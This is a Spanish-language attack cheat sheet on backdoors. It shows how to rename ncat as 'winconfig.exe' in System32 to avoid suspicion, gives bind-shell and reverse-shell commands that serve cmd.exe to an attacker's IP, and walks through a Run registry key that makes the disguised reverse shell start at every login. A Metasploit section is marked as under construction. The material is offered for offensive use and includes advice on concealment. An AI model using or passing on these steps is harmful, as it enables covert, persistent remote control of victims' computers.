# System Attacks Cheat Sheet

- [Backdor](#backdoor)
  - [Ncat](#ncat)
    - [Ejemplo básico](#ncat-ejemplo-1)
    - [Cliente conectándose a la máquina atacante y entregando una shell](#ncat-ejemplo-2)
    - [Backdoor persistente](#ncat-ejemplo-3)
  - [Metasploit con sesión en Meterpreter](#metasploit-meterpreter)

<h2 id="backdoor">Backdoor</h2>

<h3 id="ncat"><a href="https://nmap.org/ncat/">Ncat</a></h3>

Utilidad de red que permite leer y escribir datos a través de la red usando la CLI.

Para la utilización de esta herramienta en la victima, se recomienda cambiar su nombre, con la finalidad de no levantar sospechas (ejemplo: usar el nombre winconfig.exe, y guardarlo en System32).

`ncat [option]`

```
-l: Se deja al equipo en modo escucha
-p [port]: Se define el puerto con el cual se trabajará
-e [exe]: Archivo a ejecutar cuando se inicie la comunicación entre servidor y cliente
-v: Verbose
```

<h4 id="ncat-ejemplo-1">Ejemplo básico</h4>

Servidor windows, escuchando en el Puerto 5555 y al momento de iniciar la comunicación iniciará el software CMD:

`wincofig -l -p 5555 -e cmd.exe`

Cliente linux que obtiene una shell desde la máquina windows:

`ncat 192.168.1.200 -p 5555`

<h4 id="ncat-ejemplo-2">Cliente conectándose a la máquina atacante y entregando una shell</h4>

Atacante:

`ncat -l -p 5555 -v`

Víctima:

`winconfig -e cmd.exe 192.168.1.100 5555`

<h4 id="ncat-ejemplo-3">Backdoor persistente</h4>

Atacante:

`ncat -l -p 5555 -v`

Víctima:

1. run > regedit
2. Ir a HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
3. Clic derecho > New > String Value
4. Ingresar los siguientes datos:
  - `Name=winconfig`
  - `Data=”C:\Windows\System32\winconfig.exe 192.168.1.100 5555 –e cmd.exe”`

> Para que esto funcione, el usuario debe logearse en su cuenta. Una vez logeado, se iniciará el backdoor.

<h3 id="metasploit-meterpreter">Metasploit con sesión en Meterpreter</h3>

EN CONSTRUCCIÓN
